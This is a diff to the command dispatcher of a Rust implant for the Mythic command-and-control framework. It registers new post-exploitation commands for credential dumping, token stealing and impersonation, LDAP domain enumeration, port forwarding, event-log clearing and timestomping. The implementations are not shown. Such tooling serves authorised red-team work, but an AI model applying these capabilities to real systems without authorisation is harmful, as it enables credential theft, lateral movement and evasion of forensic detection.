@@ -11,8 +11,8 @@ use std::sync::{
 
 // Import all other commands
 use crate::{
-    askcreds, cat, cd, clipboard, cp, download, exit, getenv, getprivs, jobs, ls, mkdir, mv, netstat, portscan, ps, pwd,
-    redirect, rm, screenshot, setenv, shell, shinject, sleep, ssh, unsetenv, upload, workinghours,
+    askcreds, cat, cd, cleanup, clipboard, cp, credentials, download, exit, getenv, getprivs, jobs, ldap, ls, mkdir, mv, netstat, portfwd, portscan, ps, pwd,
+    redirect, rm, screenshot, setenv, shell, shinject, sleep, ssh, token, unsetenv, upload, workinghours,
 };
 
 /// Represents a background task (job)
@@ -132,7 +132,9 @@ impl Tasker {
 
                             "cat" => cat::cat_file(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "cd" => cd::change_dir(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "cleanup" => cleanup::cleanup(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "cp" => cp::copy_file(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "eventlog_clear" => cleanup::eventlog_clear(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "getenv" => getenv::get_env(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "getprivs" => getprivs::get_privileges(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "ls" => ls::make_ls(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
@@ -145,7 +147,19 @@ impl Tasker {
                             "setenv" => setenv::set_env(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "clipboard" => clipboard::take_clipboard(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "askcreds" => askcreds::ask_credentials(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "credentials_dump" => credentials::credentials_dump(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "domain_info" => ldap::domain_info(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "domain_users" => ldap::domain_users(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "domain_computers" => ldap::domain_computers(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "ldap_search" => ldap::ldap_search(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "portfwd" => portfwd::port_forward(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "ssh-agent" => ssh::agent::ssh_agent(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "timestomp" => cleanup::timestomp(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "token_list" => token::token_list(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "token_steal" => token::token_steal(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "token_make" => token::token_make(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "token_use" => token::token_use(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "token_revert" => token::token_revert(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "unsetenv" => unsetenv::unset_env(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
 
                             _ => mythic_error!(
